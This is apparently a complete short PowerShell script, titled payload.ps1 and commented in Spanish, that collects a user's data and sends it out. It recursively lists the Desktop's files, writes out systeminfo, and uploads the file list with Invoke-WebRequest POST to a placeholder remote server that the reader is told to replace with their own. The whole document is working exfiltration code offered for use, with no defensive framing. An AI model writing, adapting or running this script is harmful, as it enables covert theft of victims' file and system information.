# payload.ps1 - Recopila datos del usuario y los envía a un servidor remoto

# 1. Crear un archivo con información básica del sistema
Get-ChildItem -Path $env:USERPROFILE\Desktop -Recurse | Out-File -FilePath $env:USERPROFILE\Desktop\archivos_lista.txt

# 2. Crear un archivo con información del sistema
systeminfo | Out-File -FilePath $env:USERPROFILE\Desktop\systeminfo.txt

# 3. Subir el archivo al servidor remoto (reemplaza con tu servidor)
Invoke-WebRequest -Uri http://[::]:8080/payload.ps1 -Method POST -InFile $env:USERPROFILE\Desktop\archivos_lista.txt
